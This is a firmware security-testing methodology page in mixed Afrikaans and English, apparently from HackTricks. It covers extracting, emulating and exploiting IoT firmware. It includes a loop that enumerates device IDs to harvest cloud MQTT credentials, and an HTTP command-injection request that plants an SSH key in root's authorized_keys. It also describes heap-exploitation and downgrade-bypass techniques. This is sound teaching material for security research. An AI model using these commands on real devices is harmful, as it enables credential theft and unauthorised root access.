# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is essential software that enables devices to operate correctly by managing and facilitating communication between the hardware components and the software that users interact with. It's stored in permanent memory, ensuring the device can access vital instructions from the moment it's powered on, leading to the operating system's launch. Examining and potentially modifying firmware is a critical step in identifying security vulnerabilities.

## **Inligting insamel**

**Inligting insamel** is a critical initial step in understanding a device's makeup and the technologies it uses. This process involves collecting data on:

- The CPU architecture and operating system it runs
- Bootloader specifics
- Hardware layout and datasheets
- Codebase metrics and source locations
- External libraries and license types
- Update histories and regulatory certifications
- Architectural and flow diagrams
- Security assessments and identified vulnerabilities

For this purpose, **open-source intelligence (OSINT)** tools are invaluable, as is the analysis of any available open-source software components through manual and automated review processes. Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) offer free static analysis that can be leveraged to find potential issues.

## **Die firmware bekom**

Obtaining firmware can be approached through various means, each with its own level of complexity:

- **Directly** from the source (developers, manufacturers)
- **Building** it from provided instructions
- **Downloading** from official support sites
- Utilizing **Google dork** queries for finding hosted firmware files
- Accessing **cloud storage** directly, with tools like [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepting **updates** via man-in-the-middle techniques
- **Extracting** from the device through connections like **UART**, **JTAG**, or **PICit**
- **Sniffing** for update requests within device communication
- Identifying and using **hardcoded update endpoints**
- **Dumping** from the bootloader or network
- **Removing and reading** the storage chip, when all else fails, using appropriate hardware tools

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## **Die firmware ontleed**

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie tools vind nie, kyk na die **entropy** van die image met `binwalk -E <bin>`, as dit lae entropy het, dan is dit nie waarskynlik encrypted nie. As dit hoë entropy het, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie tools gebruik om **files embedded inside the firmware** uit te haal:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die file te inspekteer.

### Getting the Filesystem

Met die vorige kommentaar-instrumente soos `binwalk -ev <bin>` moes jy in staat gewees het om die **filesystem te extract**.\
Binwalk extract gewoonlik dit binne-in 'n **folder genaamd volgens die filesystem type**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Soms sal binwalk **nie die magic byte van die filesystem in sy signatures hê nie**. In hierdie gevalle, gebruik binwalk om **die offset van die filesystem te vind en die compressed filesystem uit die binary te carve** en **manually** die filesystem te extract volgens sy type met behulp van die stappe hieronder.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs filesystem uit te kerf.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argief lêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2 filesysteme

`$ jefferson rootfsfile.jffs2`

- Vir ubifs filesysteme met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiseer Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit uiteen te haal om sy struktuur en moontlike kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie tools om waardevolle data uit die firmware image te analiseer en te onttrek.

### Aanvanklike Analise Tools

'n Stel opdragte word voorsien vir aanvanklike inspeksie van die binêre lêer (verwys na as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings uit te haal, binêre data te analiseer, en die partisie- en filesystem-besonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te assesseer, word die **entropy** nagegaan met `binwalk -E <bin>`. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy moontlike enkripsie of kompressie aandui.

Vir die onttrekking van **embedded files**, word gereedskap en hulpbronne soos die **file-data-carving-recovery-tools** dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Uittrek van die Filesystem

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die filesystem onttrek, dikwels in ’n gids wat na die filesystem-tipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie daarin slaag om die filesystem-tipe te herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die filesystem se offset te vind, gevolg deur die `dd` opdrag om die filesystem uit te sny:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangende van die filesystem-tipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende commands gebruik om die inhoud handmatig uit te trek.

### Filesystem Analysis

Met die filesystem onttrek, begin die soektog na security flaws. Aandag word gegee aan insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, en compiled binaries vir offline analysis.

**Belangrike plekke** en **items** om te inspekteer sluit in:

- **etc/shadow** en **etc/passwd** vir user credentials
- SSL certificates en keys in **etc/ssl**
- Configuration- en script files vir moontlike vulnerabilities
- Embedded binaries vir verdere analysis
- Common IoT device web servers en binaries

Verskeie tools help om sensitive information en vulnerabilities binne die filesystem op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir search na sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir static and dynamic analysis

### Security Checks on Compiled Binaries

Beide source code en compiled binaries wat in die filesystem gevind word, moet vir vulnerabilities ondersoek word. Tools soos **checksec.sh** vir Unix binaries en **PESecurity** vir Windows binaries help om unprotected binaries te identifiseer wat uitgebuit kan word.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Baie IoT hubs haal hul per-device configuration van 'n cloud endpoint af wat lyk soos:

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware analysis kan jy vind dat `<token>` plaaslik afgelei word vanaf die device ID met 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en as uppercase hex voorgestel

Hierdie ontwerp stel enigeen wat 'n deviceId en die STATIC_KEY leer in staat om die URL te rekonstrueer en cloud config af te trek, wat dikwels plaintext MQTT credentials en topic prefixes openbaar.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Soek vir lyne wat die cloud config URL-patroon en broker-adres druk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek vir die config pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Bepaal die token in Bash en maak die digest hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Oes cloud config en MQTT credentials

- Stel die URL saam en trek JSON met curl; ontleed met jq om secrets uit te haal:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herstelde credentials om op maintenance-topics in te teken en soek na sensitiewe events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Lys voorspelbare toestel-ID’s op (op skaal, met magtiging)

- Baie ekosisteme sluit vendor OUI/produk/tipe-bisse in, gevolg deur ’n sekwensiële agtervoegsel.
- Jy kan kandidaat-ID’s deurloop, tokens aflei en configs programmaties haal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Verkry altyd eksplisiete magtiging voordat jy mass enumeration probeer.
- Verkies emulation of static analysis om secrets te herstel sonder om die teiken hardware te wysig wanneer moontlik.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik, of van ’n toestel se werking of van ’n individuele program. Hierdie benadering kan uitdagings met hardware of architecture afhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ooreenstemmende architecture en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtual machine, kan verdere testing vergemaklik.

### Emulating Individual Binaries

Vir die ondersoek van enkele programs is dit noodsaaklik om die program se endianness en CPU architecture te identifiseer.

#### Example with MIPS Architecture

Om ’n binary met MIPS architecture te emuleer, kan ’n mens die command gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sou `qemu-mipsel` die keuse wees.

#### ARM Architecture Emulation

Vir ARM binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulation gebruik word.

### Full System Emulation

Tools soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander, maak full firmware emulation moontlik, outomatiseer die proses en help met dynamic analysis.

## Dynamic Analysis in Practice

In hierdie stadium word óf ’n regte óf ’n emulated device environment vir analysis gebruik. Dit is noodsaaklik om shell access tot die OS en filesystem te behou. Emulation mag nie hardware interactions perfek naboots nie, wat af en toe emulation restarts noodsaaklik maak. Analysis moet die filesystem herbesoek, exposed webpages en network services exploit, en bootloader vulnerabilities verken. Firmware integrity tests is krities om moontlike backdoor vulnerabilities te identifiseer.

## Runtime Analysis Techniques

Runtime analysis behels interaksie met ’n process of binary in sy operating environment, met tools soos gdb-multiarch, Frida, en Ghidra vir die stel van breakpoints en die identifisering van vulnerabilities deur fuzzing en ander techniques.

Vir embedded targets sonder ’n volledige debugger, **copy a statically-linked `gdbserver`** na die device en attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Op IoT hubs word die RF-stack dikwels verdeel tussen ’n **radio MCU** en ’n Linux userland process. ’n Nuttige workflow is om die pad te map:

1. **RF frame** in die lug
2. **controller-side parser** op die radio MCU
3. **serial/UART text or TLV protocol** deurgegee na Linux (byvoorbeeld `/dev/tty*`)
4. **application dispatcher** in die main daemon
5. **protocol-specific handler / state machine**

Hierdie argitektuur skep twee reversing-targets in plaas van een. As die controller binêre radio frames na ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, herwin:

- Die **message groups** en dispatch tables
- Watter messages van die **network** kan kom teenoor die controller self
- Die presiese **manufacturer-specific discriminator fields** (byvoorbeeld Zigbee `manufacturer_code` en custom `cluster_command`)
- Watter handlers slegs bereikbaar is tydens **commissioning**, discovery, of firmware/model download phases

Vir Zigbee spesifiek, capture pairing traffic en kyk of die target steeds op die default **Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan sniffing van commissioning traffic die **Network Key** blootstel. Zigbee 3.0 install codes verminder hierdie blootstelling, so merk op of die getoetste device hulle werklik afdwing.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands is dikwels ’n beter target as gestandaardiseerde clusters omdat hulle **custom parsing code** en interne **FSMs** voer met minder battle-tested validation.

Praktiese workflow:

- Reverse die command dispatcher totdat jy die **vendor-only handler** vind.
- Herwin die **FSM state**, **event**, **check**, **action**, en **next-state** tables.
- Identifiseer **transitional states** wat auto-advance en retry/error branches wat uiteindelik attacker-controlled state reset of free.
- Bevestig watter wettige protocol exchanges nodig is om die daemon in die vulnerable state te plaas in plaas daarvan om aan te neem die buggy handler is altyd bereikbaar.

Vir timing-sensitive protocols, kan packet replay vanaf ’n Python framework te stadig wees. ’n Meer betroubare benadering is om ’n wettige device op regte hardware te emuleer (byvoorbeeld ’n **nRF52840**) met ’n vendor-grade stack sodat jy die korrekte **endpoints**, **attributes**, en commissioning timing kan blootstel.

### Fragmented-download bug class in embedded daemons

’n Herhalende firmware bug class verskyn in **fragmented blob/model/configuration downloads**:

1. Die **first fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragments valideer slegs die attacker-controlled **packet-local** fields soos `packet_total_size >= offset + chunk_len`.
3. Die copy gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **original allocated size** te kyk.

Dit laat ’n attacker toe om te stuur:

- ’n Eerste geldige fragment met ’n **small** declared total size om ’n klein heap allocation af te dwing.
- ’n Latere fragment met die **expected offset** maar ’n groter `chunk_len`.
- ’n Forged packet-local size wat die nuwe checks bevredig terwyl dit steeds die oorspronklik toegekende buffer oorloop.

Wanneer die vulnerable path agter commissioning logic sit, moet exploitation genoeg **device emulation** insluit om die target in die verwagte model-download of blob-download state te dryf voordat die malformed fragments gestuur word.

### Protocol-driven `free()` triggers

In embedded daemons is die maklikste manier om heap metadata exploitation te trigger dikwels nie "wag vir cleanup" nie, maar **force the protocol's own error handling**:

- Stuur malformed follow-up fragments om die FSM in **retry** of **error** states te druk.
- Oorskry die retry threshold sodat die daemon **resets context** en die corrupted buffer free.
- Gebruik hierdie voorspelbare `free()` om allocator-side primitives te trigger voordat die process om onverwante redes crash.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-like** allocators in embedded Linux, waar corruption van chunk metadata unlink/unbin logic in ’n write primitive kan verander. ’n Stabiele patroon is om ’n **size field** te korrupteer om allocator traversal na **fake chunks staged inside the overflowed buffer** te herlei, in plaas daarvan om onmiddellik regte bin pointers te beskadig en die process te laat crash.

## Binary Exploitation and Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde vulnerabilities vereis ’n diep begrip van die target architecture en programmering in laer-vlak tale. Binary runtime protections in embedded systems is skaars, maar wanneer dit voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere large allocation kan `__malloc_consolidate()` trigger, so enige fake chunk moet checks oorleef (sane size, `fd = 0`, en omliggende chunks wat as "in use" beskou word).
- **Non-PIE binaries under ASLR:** as ASLR geaktiveer is maar die main binary is **non-PIE**, is in-binary `.data/.bss` addresses stabiel. Jy kan ’n region target wat reeds soos ’n geldige heap chunk header lyk om ’n fastbin allocation op ’n **function pointer table** te land.
- **Parser-stopping NUL:** wanneer JSON gepars word, kan ’n `\x00` in die payload parsing stop terwyl trailing attacker-controlled bytes vir ’n stack pivot/ROP chain behou word.
- **Shellcode via `/proc/self/mem`:** ’n ROP chain wat `open("/proc/self/mem")`, `lseek()`, en `write()` aanroep, kan executable shellcode in ’n bekende mapping plaas en daarna daarheen spring.

## Prepared Operating Systems for Firmware Analysis

Operating systems soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied pre-configured environments vir firmware security testing, toegerus met nodige tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro bedoel om jou te help om security assessment en penetration testing van Internet of Things (IoT) devices uit te voer. Dit spaar jou baie tyd deur ’n pre-configured environment met al die nodige tools gelaai te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04 met firmware security testing tools vooraf gelaai.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selfs wanneer ’n vendor cryptographic signature checks vir firmware images implementeer, word **version rollback (downgrade) protection** gereeld weggelaat. Wanneer die boot- of recovery-loader slegs die signature met ’n embedded public key verifieer maar nie die *version* (of ’n monotonic counter) van die image wat geflash word vergelyk nie, kan ’n attacker wettiglik ’n **older, vulnerable firmware wat steeds ’n geldige signature dra** installeer en sodoende gepatchte vulnerabilities weer invoer.

Tipiese attack workflow:

1. **Obtain an older signed image**
* Kry dit van die vendor se publieke download portal, CDN of support site.
* Extraheer dit uit companion mobile/desktop applications (bv. binne ’n Android APK onder `assets/firmware/`).
* Haal dit van third-party repositories soos VirusTotal, Internet archives, forums, ens. af.
2. **Upload or serve the image to the device** via enige blootgestelde update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie consumer IoT devices stel *unauthenticated* HTTP(S) endpoints bloot wat Base64-encoded firmware blobs aanvaar, dit server-side decode en recovery/upgrade trigger.
3. Na die downgrade, exploit ’n vulnerability wat in die nuwer release gepatch is (byvoorbeeld ’n command-injection filter wat later bygevoeg is).
4. Optional flash die nuutste image weer of disable updates om opsporing te vermy sodra persistence verkry is.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk aan ’n shell command gekonkateer sonder sanitisation, wat injection van arbitrêre commands moontlik maak (hier – die enabling van SSH key-based root access). Later firmware-weergawe het ’n basiese character filter ingestel, maar die afwesigheid van downgrade protection maak die fix moot.

### Extracting Firmware From Mobile Apps

Baie vendors bundle volledige firmware images binne hul companion mobile applications sodat die app die device oor Bluetooth/Wi-Fi kan update. Hierdie packages word gewoonlik ongeënkripteerd in die APK/APEX gestoor onder paths soos `assets/fw/` of `res/raw/`. Tools soos `apktool`, `ghidra`, of selfs gewone `unzip` laat jou toe om signed images uit te trek sonder om die physical hardware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Updater-only anti-rollback bypass in A/B slot designs

Sommige vendors implementeer wel ’n anti-downgrade **ratchet**, maar slegs binne die *updater* logika (byvoorbeeld ’n UDS-routine oor CAN, ’n recovery command, of ’n userspace OTA agent). As die **bootloader** later net die image signature/CRC kontroleer en die partition table of slot metadata vertrou, kan rollback protection steeds omseil word.

Tipiese swak ontwerp:

- Firmware metadata bevat beide ’n version descriptor en ’n **security ratchet** / monotonic counter.
- Die updater vergelyk die image ratchet met ’n waarde wat in persistent storage gestoor is en verwerp ouer signed images.
- Die bootloader ontleed nie daardie ratchet nie en verifieer slegs header, CRC, en signature voordat die gekose slot geboot word.
- Slot activation word apart gestoor in ’n partition table of per-slot generation counter en is **nie cryptographically bound** aan die presiese firmware digest wat gevalideer is nie.

Dit skep ’n **validate-one-image / boot-another-image** primitive in dual-slot systems. As die attacker die updater kan laat slot B as die volgende boot target merk met ’n current signed image, en later slot B kan oorskryf voor reboot, kan die bootloader steeds die downgraded image boot omdat dit net die reeds-gecommitte slot metadata vertrou.

Gewone abuse pattern:

1. Laai ’n **current signed** firmware in die passive slot en voer die normale validation/switch routine uit sodat die layout daardie slot as next active merk.
2. **Moenie nog reboot nie**. Gaan weer die slot-preparation/erase routine in in dieselfde session.
3. Abuse stale boot-state of stale slot-selection logic sodat die updater dieselfde fisiese slot erase wat pas bevorder is.
4. Skryf ’n **ouer maar steeds signed** firmware in daardie slot.
5. Slaan die validation routine oor wat die ratchet afdwing en reboot direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs signature/integrity, en boot die ou image.

Dinge om na te kyk wanneer A/B update implementations reversed word:

- Slot selection afgelei van **boot-time flags** wat nie verfris word ná ’n suksesvolle switch nie.
- ’n `prepare_passive_slot()`-styl routine wat ’n slot erase op grond van stale state in plaas van die **current committed layout**.
- ’n `part_write_layout()`-styl funksie wat slegs ’n **generation counter** / active flag verhoog en nie die validated image hash stoor nie.
- Ratchet checks geïmplementeer in userspace of updater code, maar **nie** in ROM / bootloader / secure boot stages nie.
- Erase- of recovery routines wat die slot bootable laat gemerk selfs nadat die inhoud verwyder en oorgeskryf is.

### Checklist for Assessing Update Logic

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die device **version numbers** of ’n **monotonic anti-rollback counter** voor flashing?
* Word die image binne ’n secure boot chain geverifieer (bv. signatures wat deur ROM code gekontroleer word)?
* Dwing die **bootloader dieselfde ratchet** af as die updater, in plaas daarvan om slegs signature/CRC te kontroleer?
* Is slot activation metadata **gekoppel aan die validated firmware digest/version**, of kan ’n slot ná promotion gewysig word?
* Nadat ’n slot switch slaag, word die device gedwing om te reboot of is latere update/erase routines steeds in dieselfde session bereikbaar?
* Voer userland code bykomende sanity checks uit (bv. toegelate partition map, model number)?
* Gebruik *partial* of *backup* update flows dieselfde validation logic weer?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Vulnerable firmware to practice

Om te oefen om vulnerabilities in firmware te ontdek, gebruik die volgende vulnerable firmware projects as ’n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
